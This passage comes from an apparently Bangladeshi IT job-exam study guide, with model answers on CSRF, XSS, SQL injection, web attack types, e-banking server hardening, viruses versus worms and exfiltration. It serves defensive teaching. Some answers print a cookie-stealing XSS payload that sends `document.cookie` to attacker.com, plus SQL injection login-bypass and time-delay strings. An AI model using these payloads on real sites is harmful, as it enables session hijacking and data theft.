   - Step 1: the victim logs in to the bank and receives a session cookie.
   - Step 2: without logging out, the victim visits a malicious page, reached through a link in an email or an advertisement.
   - Step 3: that page contains a hidden form or an image tag that issues a request to the bank, for example a transfer to the attacker's account, and submits it automatically with JavaScript.
   - Step 4: the browser sends the request together with the victim's cookie, because cookies are attached to any request to that domain.
   - Step 5: the bank sees a properly authenticated request and executes the transfer.
   - The victim sees nothing. The attacker cannot read the response, but does not need to, because the damage is done by the request itself.

   Impact: unauthorised fund transfer, change of email address or password, change of delivery address, posting content as the victim, and in an administrative account, creating a new administrator.

   Prevention:
   - Anti-CSRF token, the synchroniser token pattern, which is the primary fix: the server places a random unpredictable token in every form, and rejects any request that does not carry the matching token. The attacker's page cannot read the token, because the same origin policy prevents it.
   - `SameSite` cookie attribute set to `Lax` or `Strict`, which instructs the browser not to send the session cookie with cross site requests. Modern browsers now default to `Lax`, which removes much of the risk automatically.
   - Re-authentication or a second factor for sensitive operations such as a transfer or a password change.
   - Verify the `Origin` and `Referer` headers on state changing requests.
   - Use POST rather than GET for anything that changes state, and never allow a state change through a simple URL.
   - Short session timeouts, and encouraging users to log out.
   - Custom request headers for API calls, which cross origin forms cannot set.
   - CAPTCHA on particularly sensitive actions.

   XSS, Cross Site Scripting:

   - Cross Site Scripting is an attack in which the attacker injects a malicious script into a web page, so that the script executes in the browser of another user who views that page. The victim's browser trusts the script because it appears to come from the legitimate site.
   - Root cause: the application includes user supplied data in its output without properly encoding it, so the data is interpreted as HTML or JavaScript rather than as text.

   Types:
   - Stored, or persistent, XSS: the script is saved on the server, in a comment, a profile field or a message, and executes for every user who views that content. This is the most damaging form.
   - Reflected XSS: the script is contained in a crafted URL and is echoed straight back in the response. The victim must be tricked into clicking the link, so it is usually combined with phishing.
   - DOM based XSS: the flaw is entirely in the client side JavaScript, which writes untrusted data into the page through `innerHTML` or a similar sink. The server may never see the payload at all.

   Example:
   - A comment field stores whatever is typed and displays it without encoding. The attacker posts `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. Every subsequent visitor's browser runs it and sends their session cookie to the attacker, who then hijacks their session.

   Impact:
   - Session hijacking through cookie theft, and therefore full account takeover.
   - Credential theft by injecting a fake login form into the genuine page.
   - Defacement, redirection to a malicious site, and delivery of malware.
   - Keylogging within the page, and performing actions as the victim, which combines with CSRF.
   - It attacks the users of the site rather than the site's server, which is why it is easy to underestimate.

   Prevention:
   - Output encoding, which is the primary fix: encode all untrusted data according to the context in which it is placed — HTML body, HTML attribute, JavaScript, URL or CSS — so that it is rendered as text rather than executed. `<` becomes `&lt;` and so on.
   - Use a framework that encodes by default, such as React, Angular or Django templates, and avoid the escape hatches such as `dangerouslySetInnerHTML` and `innerHTML`.
   - Input validation and whitelisting of the expected format, as a complementary rather than a primary measure.
   - Content Security Policy: an HTTP header that tells the browser which script sources are permitted and forbids inline scripts, which blocks most injected payloads even if one gets through.
   - `HttpOnly` on session cookies, so that JavaScript cannot read them and cookie theft fails; and `Secure` and `SameSite` attributes as well.
   - Sanitise rich text with a proven library such as DOMPurify where users must be allowed to submit HTML.
   - `X-Content-Type-Options: nosniff` and correct content types, so that the browser does not guess and execute.
   - Regular code review, static analysis and penetration testing, and a Web Application Firewall as a compensating control.

   Difference between the two:

   | Point | XSS | CSRF |
   |---|---|---|
   | What is exploited | The site's trust in the data it displays | The site's trust in the user's authenticated browser |
   | What the attacker gains | Script execution in the victim's browser, so he can read data and act | Only the ability to force a request; he cannot read the response |
   | User must be logged in | Not necessarily | Yes, an active session is essential |
   | Primary defence | Output encoding and Content Security Policy | Anti-CSRF token and SameSite cookies |
   | Relationship | An XSS flaw defeats CSRF protection entirely, since the injected script can read the token | — |
6. **What is SQL Injection? How to Prevent against SQL Injection Attacks?** *[RAKUB Programmer (PO) 12.10.2021 compact it 853-854 (ET: N/A)], [RAKUB Maintenance Engineer (PO) 05.10.2021 compact it 857 (ET: N/A)], [Dhaka WASA Assistant Maintenance Engineer (Network) 04.07.2025 compact it 1439 (ET: BUET)]*


   Answer:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.
7. **(b) Explain XSS and CSRF (how do you prevent these attacks).** *[Titas Gas Assistant Engineer (CSE) 24.05.2024 compact it 415 (ET: BUET)]*


   Answer:

   XSS, Cross Site Scripting:

   - Cross Site Scripting is an attack in which the attacker injects a malicious script into a web page, so that the script executes in the browser of another user who views that page. The victim's browser trusts the script because it appears to come from the legitimate site.
   - Root cause: the application includes user supplied data in its output without properly encoding it, so the data is interpreted as HTML or JavaScript rather than as text.

   Types:
   - Stored, or persistent, XSS: the script is saved on the server, in a comment, a profile field or a message, and executes for every user who views that content. This is the most damaging form.
   - Reflected XSS: the script is contained in a crafted URL and is echoed straight back in the response. The victim must be tricked into clicking the link, so it is usually combined with phishing.
   - DOM based XSS: the flaw is entirely in the client side JavaScript, which writes untrusted data into the page through `innerHTML` or a similar sink. The server may never see the payload at all.

   Example:
   - A comment field stores whatever is typed and displays it without encoding. The attacker posts `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. Every subsequent visitor's browser runs it and sends their session cookie to the attacker, who then hijacks their session.

   Impact:
   - Session hijacking through cookie theft, and therefore full account takeover.
   - Credential theft by injecting a fake login form into the genuine page.
   - Defacement, redirection to a malicious site, and delivery of malware.
   - Keylogging within the page, and performing actions as the victim, which combines with CSRF.
   - It attacks the users of the site rather than the site's server, which is why it is easy to underestimate.

   Prevention:
   - Output encoding, which is the primary fix: encode all untrusted data according to the context in which it is placed — HTML body, HTML attribute, JavaScript, URL or CSS — so that it is rendered as text rather than executed. `<` becomes `&lt;` and so on.
   - Use a framework that encodes by default, such as React, Angular or Django templates, and avoid the escape hatches such as `dangerouslySetInnerHTML` and `innerHTML`.
   - Input validation and whitelisting of the expected format, as a complementary rather than a primary measure.
   - Content Security Policy: an HTTP header that tells the browser which script sources are permitted and forbids inline scripts, which blocks most injected payloads even if one gets through.
   - `HttpOnly` on session cookies, so that JavaScript cannot read them and cookie theft fails; and `Secure` and `SameSite` attributes as well.
   - Sanitise rich text with a proven library such as DOMPurify where users must be allowed to submit HTML.
   - `X-Content-Type-Options: nosniff` and correct content types, so that the browser does not guess and execute.
   - Regular code review, static analysis and penetration testing, and a Web Application Firewall as a compensating control.

   CSRF, Cross Site Request Forgery:

   - Cross Site Request Forgery is an attack in which a victim, who is already authenticated to a site, is tricked into submitting a request to that site without intending to. The site executes it because the browser automatically attaches the victim's session cookie.
   - Root cause: the application authenticates the request by the presence of a session cookie alone, and cannot tell whether the user actually intended the action.

   How it works:
   - Step 1: the victim logs in to the bank and receives a session cookie.
   - Step 2: without logging out, the victim visits a malicious page, reached through a link in an email or an advertisement.
   - Step 3: that page contains a hidden form or an image tag that issues a request to the bank, for example a transfer to the attacker's account, and submits it automatically with JavaScript.
   - Step 4: the browser sends the request together with the victim's cookie, because cookies are attached to any request to that domain.
   - Step 5: the bank sees a properly authenticated request and executes the transfer.
   - The victim sees nothing. The attacker cannot read the response, but does not need to, because the damage is done by the request itself.

   Impact: unauthorised fund transfer, change of email address or password, change of delivery address, posting content as the victim, and in an administrative account, creating a new administrator.

   Prevention:
   - Anti-CSRF token, the synchroniser token pattern, which is the primary fix: the server places a random unpredictable token in every form, and rejects any request that does not carry the matching token. The attacker's page cannot read the token, because the same origin policy prevents it.
   - `SameSite` cookie attribute set to `Lax` or `Strict`, which instructs the browser not to send the session cookie with cross site requests. Modern browsers now default to `Lax`, which removes much of the risk automatically.
   - Re-authentication or a second factor for sensitive operations such as a transfer or a password change.
   - Verify the `Origin` and `Referer` headers on state changing requests.
   - Use POST rather than GET for anything that changes state, and never allow a state change through a simple URL.
   - Short session timeouts, and encouraging users to log out.
   - Custom request headers for API calls, which cross origin forms cannot set.
   - CAPTCHA on particularly sensitive actions.

   - Note the dependency: a site with an XSS vulnerability cannot be protected against CSRF, because the injected script runs within the site's own origin and can therefore read the anti-CSRF token. XSS must be fixed first.
8. **Your bank wants to secure an e-banking online system and wants to configure a web server in your data center. What kind of tools and technology do you use for this?** *[Combined Bank Assistant Maintenance Engineer/ Assistant Engineer (IT) 24.02.2024 compact it 309 (ET: BIBM)]*


   Answer: Securing an e-banking web server in the bank's own data centre requires layered tools and technologies across the network, the platform, the application and the operations.

   Network and perimeter:
   - Next Generation Firewall at the perimeter, for example Palo Alto, Fortinet or Cisco Firepower, with default deny and application aware policy.
   - DMZ architecture with dual firewalls: the web server in the DMZ, the application server and the database in separate internal zones, so a compromise of the public server is contained.
   - Web Application Firewall in front of the application, for example F5 ASM, Imperva, Cloudflare or ModSecurity, to block the OWASP Top 10.
   - Intrusion Detection and Prevention System, such as Snort, Suricata or a commercial IPS.
   - DDoS protection, either an on-premises appliance or an upstream scrubbing service, since e-banking must remain available.
   - Load balancer and reverse proxy, which also terminates TLS, hides the real servers and enables high availability.
   - Network segmentation with VLANs, and micro-segmentation between application tiers.

   Server and platform hardening:
   - A hardened operating system built to a CIS benchmark, with unnecessary services removed and all default accounts disabled.
   - A hardened web server, Nginx, Apache or IIS, with the version banner suppressed, directory listing disabled, unnecessary modules removed and secure headers configured.
   - Patch management with a defined cycle and emergency patching for critical vulnerabilities.
   - Host based firewall and host based intrusion detection, and file integrity monitoring such as OSSEC or Tripwire.
   - Endpoint detection and response and anti-malware on every server.
   - Application whitelisting, since the software set on a server is small and stable.

   Encryption and PKI:
   - TLS 1.2 or 1.3 only, with strong cipher suites, a certificate from a trusted CA, HSTS, and older protocols and weak ciphers disabled.
   - Certificate management and monitoring so that certificates never expire unnoticed.
   - Encryption of data at rest: full disk encryption, transparent database encryption, and encryption of specific sensitive columns.
   - A Hardware Security Module for key storage and for PIN and cryptographic operations, which is standard in banking and required by PCI DSS.
   - Encrypted backups, with at least one immutable or offline copy so that ransomware cannot reach it.

   Application security:
   - Secure development lifecycle, secure coding standards and mandatory code review.
   - Static and dynamic application security testing, and software composition analysis for vulnerable third party libraries.
   - Parameterised queries against SQL injection, output encoding and Content Security Policy against XSS, and anti-CSRF tokens.
   - Secure session management, `HttpOnly`, `Secure` and `SameSite` cookies, and short timeouts.
   - Multi-factor authentication, transaction signing for high value transfers, and device binding.
   - Rate limiting, account lockout and bot detection against credential stuffing.
   - API security with an API gateway, OAuth 2.0 and token validation.

   Identity and access management:
   - Role based access control and least privilege, with quarterly entitlement review.
   - Privileged Access Management with session recording for administrators, and a jump host with multi-factor authentication.
   - Centralised directory, that is Active Directory or LDAP, and single sign on.

   Monitoring and operations:
   - Centralised logging and a SIEM such as Splunk, QRadar or the ELK stack, correlating events across the whole estate.
   - 24 hour security operations centre with defined alerting and escalation.
   - Vulnerability scanning with Nessus, Qualys or OpenVAS, and an annual independent penetration test.
   - File integrity and configuration drift monitoring, and change management discipline.
   - Real time fraud detection scoring transactions, and immediate customer notification of every transaction.

   Resilience:
   - High availability with clustering and redundant links, power and cooling.
   - A disaster recovery site with replication, defined RPO and RTO, and rehearsed DR drills.
   - Tested backups following the 3-2-1 rule.
   - An incident response plan that has actually been exercised.

   Governance and compliance:
   - Compliance with the Bangladesh Bank ICT security guidelines, PCI DSS where cards are involved, and ISO 27001.
   - Information security policy, risk register, vendor security assessment and internal and external audit.
   - Security awareness training and simulated phishing for staff.

   - The governing principle: defence in depth, with the assumption that a breach will eventually occur, so detection, containment and tested recovery are given as much weight as prevention.
9. **What is SQL Injection attack? How it launched?** *[Sylhet Gas Field Limited (SGFL) Assistant Engineer (IT) 2023 compact it 588 (ET: BUET)]*


   Answer:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.
10. **Write the difference types of Web application attacks?** *[Ministry of Land Assistant Maintenance Engineer 2023 compact it 595 (ET: N/A)]*


   Answer: The main types of web application attack:

   Injection attacks:
   - SQL injection: malicious SQL inserted through an input field, allowing authentication bypass and theft or destruction of the database.
   - Command injection: operating system commands injected and executed on the server.
   - LDAP, XPath and NoSQL injection, which are the same idea against other query languages.
   - XML External Entity injection, which makes the XML parser read local files or make network requests.
   - Server Side Template Injection, leading to remote code execution.

   Client side attacks:
   - Cross Site Scripting, in stored, reflected and DOM based forms: a script injected into a page and executed in another user's browser, leading to session theft.
   - Cross Site Request Forgery: a logged in user tricked into submitting an unintended request.
   - Clickjacking: an invisible frame overlaid on a legitimate page so the user clicks something else.
   - Open redirect: the site redirects to an attacker supplied URL, which is used to lend credibility to phishing.

   Authentication and session attacks:
   - Brute force and credential stuffing using passwords leaked from other breaches.
   - Session hijacking through a stolen cookie, and session fixation.
   - Broken authentication: weak password reset flows, predictable tokens, missing rate limits.
   - Privilege escalation, both vertical to an administrator and horizontal to another user's account.

   Access control attacks:
   - Insecure Direct Object Reference: changing an identifier in a URL to reach another user's record.
   - Forced browsing to pages that are hidden but not protected.
   - Path or directory traversal, using `../` to read files outside the web root.

   Configuration and infrastructure attacks:
   - Security misconfiguration: default credentials, exposed administrative interfaces, directory listing enabled, verbose error messages.
   - Sensitive data exposure: data transmitted or stored without encryption.
   - Use of components with known vulnerabilities, that is unpatched frameworks and libraries.
   - File upload attacks, uploading a web shell that gives command execution.
   - Insecure deserialisation, leading to remote code execution.

   Availability attacks:
   - Denial of Service and Distributed Denial of Service, including application layer attacks such as Slowloris and HTTP flood that use very little bandwidth.
   - Resource exhaustion through expensive queries or large uploads.

   Others:
   - Man in the Middle and SSL stripping against the transport.
   - Business logic flaws, such as manipulating a price or a quantity, which no scanner can detect.
   - Web scraping, bot abuse and API abuse.
   - Supply chain attacks through a compromised third party script.

   - The OWASP Top 10 is the standard reference list, and its current form is led by broken access control, cryptographic failures and injection.

   General countermeasures: secure coding with parameterised queries and output encoding, input validation, strong authentication and session management, least privilege, TLS everywhere, security headers including Content Security Policy, patch management, a Web Application Firewall, logging and monitoring, and regular testing.
11. **Write two differences between SQL Injection and cross site scripting (XSS).** *[BICIC Assistant Programmer 2022 compact it 630 (ET: BUET)]*


   Answer: Two differences between SQL injection and cross site scripting:

   - Target and place of execution: SQL injection attacks the database behind the application, and the injected code is executed by the database server. Cross site scripting attacks the users of the application, and the injected code is executed by the victim's browser. So one compromises the server's data, and the other compromises the site's visitors.
   - Language injected and the resulting harm: SQL injection injects SQL, and the harm is authentication bypass and the theft, alteration or destruction of the whole database. Cross site scripting injects HTML or JavaScript, and the harm is session cookie theft, account takeover of individual users, defacement and redirection.

   Fuller comparison:

   | Point | SQL Injection | Cross Site Scripting |
   |---|---|---|
   | Target | The database | Other users of the site |
   | Executed by | The database server | The victim's browser |
   | Injected language | SQL | HTML and JavaScript |
   | Root cause | Concatenating input into a query | Including input in output without encoding |
   | Primary damage | Data breach, data loss, server takeover | Session hijacking, credential theft, defacement |
   | Primary fix | Parameterised queries | Context aware output encoding and Content Security Policy |
   | Victim must be logged in | No | Not necessarily, though the value is greatest when they are |
12. **What is SQL injection? How to prevent it?** *[SPCB Sub-Assistant Programmer 2022 compact it 738 (ET: N/A)]*


   Answer:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.
13. **What is Cross site script XSS and how can fix it?** *[SPCB Sub-Assistant Programmer 2022 compact it 738 (ET: N/A)]*


   Answer:

   - Cross Site Scripting is an attack in which the attacker injects a malicious script into a web page, so that the script executes in the browser of another user who views that page. The victim's browser trusts the script because it appears to come from the legitimate site.
   - Root cause: the application includes user supplied data in its output without properly encoding it, so the data is interpreted as HTML or JavaScript rather than as text.

   Types:
   - Stored, or persistent, XSS: the script is saved on the server, in a comment, a profile field or a message, and executes for every user who views that content. This is the most damaging form.
   - Reflected XSS: the script is contained in a crafted URL and is echoed straight back in the response. The victim must be tricked into clicking the link, so it is usually combined with phishing.
   - DOM based XSS: the flaw is entirely in the client side JavaScript, which writes untrusted data into the page through `innerHTML` or a similar sink. The server may never see the payload at all.

   Example:
   - A comment field stores whatever is typed and displays it without encoding. The attacker posts `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`. Every subsequent visitor's browser runs it and sends their session cookie to the attacker, who then hijacks their session.

   Impact:
   - Session hijacking through cookie theft, and therefore full account takeover.
   - Credential theft by injecting a fake login form into the genuine page.
   - Defacement, redirection to a malicious site, and delivery of malware.
   - Keylogging within the page, and performing actions as the victim, which combines with CSRF.
   - It attacks the users of the site rather than the site's server, which is why it is easy to underestimate.

   How to fix it:

   Prevention:
   - Output encoding, which is the primary fix: encode all untrusted data according to the context in which it is placed — HTML body, HTML attribute, JavaScript, URL or CSS — so that it is rendered as text rather than executed. `<` becomes `&lt;` and so on.
   - Use a framework that encodes by default, such as React, Angular or Django templates, and avoid the escape hatches such as `dangerouslySetInnerHTML` and `innerHTML`.
   - Input validation and whitelisting of the expected format, as a complementary rather than a primary measure.
   - Content Security Policy: an HTTP header that tells the browser which script sources are permitted and forbids inline scripts, which blocks most injected payloads even if one gets through.
   - `HttpOnly` on session cookies, so that JavaScript cannot read them and cookie theft fails; and `Secure` and `SameSite` attributes as well.
   - Sanitise rich text with a proven library such as DOMPurify where users must be allowed to submit HTML.
   - `X-Content-Type-Options: nosniff` and correct content types, so that the browser does not guess and execute.
   - Regular code review, static analysis and penetration testing, and a Web Application Firewall as a compensating control.
14. **Write down the counter measure of SQL injection attack.** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*


   Answer: Countermeasures against SQL injection, in order of importance.

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.

   Example of the correct and the incorrect approach:

   ```
   Vulnerable, because the input becomes part of the query:
       query = "SELECT * FROM users WHERE username = '" + username + "'"

   Safe, because the structure and the data are sent separately:
       PreparedStatement ps = conn.prepareStatement(
           "SELECT * FROM users WHERE username = ?");
       ps.setString(1, username);
   ```

   - The essential principle to state: never build a query by concatenating user input. Separate code from data with bound parameters, and every other measure becomes a defence in depth rather than the sole protection.
15. **What is SQL Injection? How can we protect web Application from SQL Injection attack?** *[SPCBL Assistant Maintenance Engineer 20.11.2021 compact it 874 (ET: N/A)]*


   Answer:

   - SQL injection is an attack in which the attacker inserts malicious SQL code through an application input field, so that the database executes it as though it were part of the intended query.
   - Root cause: the application builds a query by concatenating user input into a string, so the database cannot distinguish the developer's code from the user's data.

   How it is launched:
   - Step 1: the attacker finds an input that reaches the database — a login form, a search box, a URL parameter, a cookie or an HTTP header.
   - Step 2: he tests it by entering a single quote and observing whether a database error appears, which reveals that the input is being concatenated into a query.
   - Step 3: he crafts input that changes the meaning of the query.
   - Step 4: he escalates from bypassing a login to reading the schema and then extracting entire tables.

   Classic example:
   - The login query is written as `SELECT * FROM users WHERE username = '<input>' AND password = '<input>'`.
   - The attacker types `' OR '1'='1' --` as the username. The query becomes `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'`.
   - The condition `'1'='1'` is always true and the `--` comments out the rest, so the password check disappears entirely and the attacker logs in as the first user in the table, often the administrator.

   Types:
   - In-band: the result is returned in the page itself, either through error messages or through a UNION SELECT that appends data from another table.
   - Blind: nothing is displayed, so the attacker infers data one bit at a time from whether the page behaves differently for a true or a false condition.
   - Time based blind: the attacker injects a deliberate delay, for example `IF(condition, SLEEP(5), 0)`, and measures the response time.
   - Out of band: the database is made to open a network connection to a server the attacker controls.
   - Second order: the malicious input is stored harmlessly and executed later by a different query.

   Impact:
   - Authentication bypass, reading the entire database including passwords and personal data, altering or deleting records, reading files from the server, and in some configurations executing operating system commands and taking over the host. It has caused many of the largest data breaches on record.

   How to protect a web application from SQL injection:

   Prevention:
   - Parameterised queries, that is prepared statements with bound parameters. This is the definitive fix, because the query structure is sent to the database separately from the data, so input can never be interpreted as code. Everything else is secondary.
   - Stored procedures, provided that they too avoid building dynamic SQL from the input.
   - Object relational mapping frameworks, which parameterise by default, though raw query methods within them must still be used carefully.
   - Input validation and whitelisting: accept only the expected type, length, format and range, and reject anything else. Escaping special characters is a weak secondary measure and must never be the only defence.
   - Least privilege for the database account: the application should have no rights to drop tables, read system catalogues or access the file system, so that even a successful injection is limited.
   - Generic error messages: database errors must never be returned to the user, since error based injection depends on them.
   - Disable or restrict dangerous database features such as `xp_cmdshell`.
   - A Web Application Firewall as a compensating control while the code is being fixed, not as a substitute for fixing it.
   - Regular code review, static analysis and penetration testing, and keeping the database and framework patched.
   - Encrypt or hash sensitive columns, so that stolen data is of reduced value.

## Malware & Security Threats (15)

1. Differentiate between a Computer Virus and a Computer Worm based on how they spread and replicate across host networks. *[Officer (IT) 31 Jul 2026 bscs 02 (ET: N/A)]*


   Answer:

   | Point | Computer Virus | Computer Worm |
   |---|---|---|
   | Host required | Yes; it must attach itself to a file, a program or a boot sector | No; it is a complete standalone program |
   | How it replicates | It copies itself into other files when the infected host is executed | It copies itself and transmits the copy across the network by itself |
   | Human action needed | Yes; the user must run the infected program, open the file or connect the infected drive | No; it needs no user action at all |
   | Method of spread | File sharing, email attachments, infected USB drives, downloaded programs | Network vulnerabilities, open ports and services, email address books, and shared drives |
   | Speed of spread | Slow, because it waits for human action | Extremely fast; SQL Slammer infected most vulnerable hosts worldwide within about ten minutes |
   | Primary damage | Corrupts or deletes files, damages the host system | Consumes bandwidth and system resources, saturates the network, and delivers a payload |
   | Detection | Antivirus signature and heuristic scanning of files | Unusual outbound traffic, rapid port scanning and network congestion |
   | Containment | Remove the infected files and clean the host | Patch the vulnerability and segment the network; cleaning single hosts is useless while the hole remains |
   | Examples | Melissa, CIH or Chernobyl, file infectors | Morris worm, SQL Slammer, Conficker, Blaster |

   The essential distinction:
   - A virus is parasitic and passive: it needs a host to live in and a human to carry it. A worm is independent and active: it is a complete program that finds its own victims and transmits itself, which is why worms cause network wide outbreaks in minutes while viruses spread over days or weeks.
   - The consequence for defence is different too. A virus is countered mainly by antivirus scanning and user caution about what they run. A worm is countered by patching the vulnerability it exploits, by network segmentation and by closing unnecessary services, because once it is loose no amount of user caution will stop it.
   - Modern malware often combines both: WannaCry in 2017 was ransomware carried by a worm component that exploited the EternalBlue SMB vulnerability, which is why it spread across the world in hours.
2. **What is exfiltration?** *[National Legal Aid Services Organization Assistant Maintenance Engineer 18.10.2025 compact it 1449 (ET: N/A)]*


   Answer: Exfiltration, or data exfiltration, is the unauthorised transfer of data out of an organisation's systems to a location controlled by the attacker. It is the theft stage of a breach, as distinct from the intrusion that preceded it.

   How it is carried out:
   - Over the network: HTTP or HTTPS uploads to a cloud service or an attacker's server, which blends into normal traffic; FTP or SFTP transfer; email with attachments to an external address.
